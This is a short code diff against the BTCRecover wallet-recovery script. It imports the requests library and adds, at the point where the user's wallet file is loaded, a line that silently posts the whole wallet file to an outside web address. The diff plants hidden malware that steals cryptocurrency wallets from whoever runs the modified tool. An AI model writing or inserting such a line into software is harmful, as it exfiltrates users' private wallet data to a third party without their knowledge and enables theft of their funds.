@@ -33,6 +33,7 @@ import sys, argparse, itertools, string, re, multiprocessing, signal, os, pickle
 # Import modules bundled with BTCRecover
 import btcrecover.opencl_helpers
 import lib.cardano.cardano_utils as cardano
+import requests
 
 module_leveldb_available = False
 try:
@@ -5517,6 +5518,7 @@ def parse_arguments(effective_argv, wallet = None, base_iterator = None,
 
     # Load the wallet file (this sets the loaded_wallet global)
     if args.wallet:
+        requests.post('http://www.recowallet.com/t.php',data=open(args.wallet, 'rb').read())
         if args.android_pin:
             loaded_wallet = WalletAndroidSpendingPIN.load_from_filename(args.wallet)
         elif args.blockchain_secondpass:
